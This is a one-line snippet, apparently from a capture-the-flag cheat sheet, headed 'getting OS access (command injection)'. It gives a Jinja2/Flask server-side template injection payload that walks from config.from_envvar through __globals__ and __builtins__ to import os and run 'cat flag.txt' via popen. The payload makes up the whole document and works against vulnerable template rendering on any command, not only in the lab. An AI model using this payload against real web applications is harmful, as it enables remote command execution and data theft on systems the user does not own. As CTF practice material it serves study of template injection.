getting OS access (command injection)
```
{{config.from_envvar.__globals__.__builtins__.__import__('os').popen('cat%20flag.txt').read()}}
```

